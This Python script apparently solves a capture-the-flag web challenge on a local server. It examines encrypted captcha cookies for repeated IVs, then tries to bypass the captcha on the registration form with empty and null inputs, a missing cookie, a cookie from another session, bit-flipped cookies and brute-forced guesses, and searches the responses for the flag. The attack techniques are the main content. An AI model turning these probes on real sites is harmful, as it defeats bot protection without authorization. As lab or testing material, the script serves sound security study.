import requests
import base64
import re
import time

URL = "http://127.0.0.1:32869/"

print("[*] Analyzing captcha system...")

# Get multiple sessions to analyze patterns
sessions = []
for i in range(5):
    r = requests.get(URL, timeout=3)
    captcha_b64 = r.cookies['captcha']
    session = r.cookies['session']
    csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text).group(1)
    
    captcha_bytes = base64.b64decode(captcha_b64)
    
    print(f"\nSession {i+1}:")
    print(f"  Captcha: {captcha_bytes.hex()}")
    print(f"  Length: {len(captcha_bytes)}")
    print(f"  IV: {captcha_bytes[:16].hex()}")
    print(f"  CT: {captcha_bytes[16:].hex()}")
    
    sessions.append({
        'captcha_b64': captcha_b64,
        'session': session,
        'csrf': csrf,
        'bytes': captcha_bytes
    })
    
    time.sleep(0.2)

# Check if IVs or CTs repeat
ivs = [s['bytes'][:16] for s in sessions]
cts = [s['bytes'][16:] for s in sessions]

print("\n[*] Pattern analysis:")
print(f"Unique IVs: {len(set(map(bytes.hex, ivs)))}/{len(ivs)}")
print(f"Unique CTs: {len(set(map(bytes.hex, cts)))}/{len(cts)}")

# Try bypasses
print("\n[*] Testing bypass techniques...")

s = requests.Session()
test_session = sessions[0]

# Test 1: Empty captcha
resp = s.post(URL,
    data={'username':'test1','captcha':'','csrf_token':test_session['csrf'],'submit':'Register'},
    cookies={'session':test_session['session'],'captcha':test_session['captcha_b64']},
    timeout=2)
print(f"\nEmpty captcha: {resp.status_code} - {'FLAG' in resp.text}")

# Test 2: Space
resp = s.post(URL,
    data={'username':'test2','captcha':' ','csrf_token':test_session['csrf'],'submit':'Register'},
    cookies={'session':test_session['session'],'captcha':test_session['captcha_b64']},
    timeout=2)
print(f"Space captcha: {resp.status_code} - {'FLAG' in resp.text}")

# Test 3: Null byte
resp = s.post(URL,
    data={'username':'test3','captcha':'\x00','csrf_token':test_session['csrf'],'submit':'Register'},
    cookies={'session':test_session['session'],'captcha':test_session['captcha_b64']},
    timeout=2)
print(f"Null captcha: {resp.status_code} - {'FLAG' in resp.text}")

# Test 4: No captcha cookie
resp = s.post(URL,
    data={'username':'test4','captcha':'anything','csrf_token':test_session['csrf'],'submit':'Register'},
    cookies={'session':test_session['session']},
    timeout=2)
print(f"No cookie: {resp.status_code} - {'FLAG' in resp.text}")

# Test 5: Different session's captcha
if len(sessions) >= 2:
    resp = s.post(URL,
        data={'username':'test5','captcha':'test','csrf_token':sessions[0]['csrf'],'submit':'Register'},
        cookies={'session':sessions[0]['session'],'captcha':sessions[1]['captcha_b64']},
        timeout=2)
    print(f"Cross-session: {resp.status_code} - {'FLAG' in resp.text}")

# Test 6: Modified captcha cookie (flip bits)
modified = bytearray(sessions[0]['bytes'])
modified[0] ^= 1
modified_b64 = base64.b64encode(bytes(modified)).decode()
resp = s.post(URL,
    data={'username':'test6','captcha':'test','csrf_token':sessions[0]['csrf'],'submit':'Register'},
    cookies={'session':sessions[0]['session'],'captcha':modified_b64},
    timeout=2)
print(f"Modified cookie: {resp.status_code} - {'FLAG' in resp.text}")

# Test 7: Try to reuse same session with different captcha values
print("\n[*] Testing if we can brute force with same session...")
test_vals = ['123456', '000000', 'test', 'captcha', 'abcdef', '999999']
for val in test_vals:
    resp = s.post(URL,
        data={'username':f'user_{val}','captcha':val,'csrf_token':sessions[0]['csrf'],'submit':'Register'},
        cookies={'session':sessions[0]['session'],'captcha':sessions[0]['captcha_b64']},
        timeout=2)
    
    if 'FLAG{' in resp.text:
        print(f"\n[!!!] SUCCESS with value: {val}")
        print(resp.text)
        flag = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag:
            print(f"\nFLAG: {flag.group(0)}")
        break
    else:
        print(f"  {val}: Failed ({len(resp.text)} bytes)")

print("\n[*] Analysis complete")

